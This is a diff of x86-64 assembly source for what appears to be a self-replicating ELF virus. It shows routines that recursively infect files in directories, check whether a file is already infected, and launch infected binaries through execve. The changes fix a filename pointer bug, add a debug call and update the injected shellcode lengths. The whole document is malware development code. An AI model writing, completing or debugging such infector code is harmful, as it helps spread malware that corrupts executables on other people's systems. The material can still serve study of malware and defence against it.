@@ -559,7 +559,7 @@ handle_dir:
 	pop rdx
 	pop rsi
 	pop rdi
-
+	call debugy
 retn
 
 ;void rec_infect_dir(char *fname)
@@ -595,7 +595,7 @@ rec_infect_dir:
 			call famine_file ; void famine_file(char * fname);
 			cmp r11, 0
 			je rec_skip_file; we still need to find a file able to infect others
-			mov rdi, [r9 + 19];filename
+			lea rdi, [r9 + 19];filename
 			call launch_infected
 			rec_skip_file: 
 			mov rsi, r8
@@ -620,6 +620,7 @@ retn
 ;void launch_infected(char *fname)
 ;basically execve(fname, {fname, NULL}, {NULL});
 launch_infected:
+	;call ft_puts
 	sub rsp, 16; {fname, NULL}
 
 	mov QWORD[rsp], rdi
@@ -804,7 +805,7 @@ check_already_infected:
 	cai_not_found:
 		mov rax, 0
 		jmp end_of_cai
-	cai_found :
+	cai_found:
 		mov rax, 1
 	end_of_cai:
 		add rsp, 9
@@ -968,9 +969,9 @@ push rdx
 	pop rcx
 retn
 
-%define SHELLCODE_LEN 6449 ; 44 + 5 (jmp) + 12 (exit) + signature (39)
-%define SHELLCODE_JMP_INDEX 6398 ; 44 + 5 (jmp)
-%define PURE_SHELLCODE_LEN 6393 
+%define SHELLCODE_LEN 6468 ; 44 + 5 (jmp) + 12 (exit) + signature (39)
+%define SHELLCODE_JMP_INDEX 6417 ; 44 + 5 (jmp)
+%define PURE_SHELLCODE_LEN 6412 
 ; void parse64elf(void *file, int wfd, unsigned long fsize)
 parse64elf:
 	sub rsp, 8
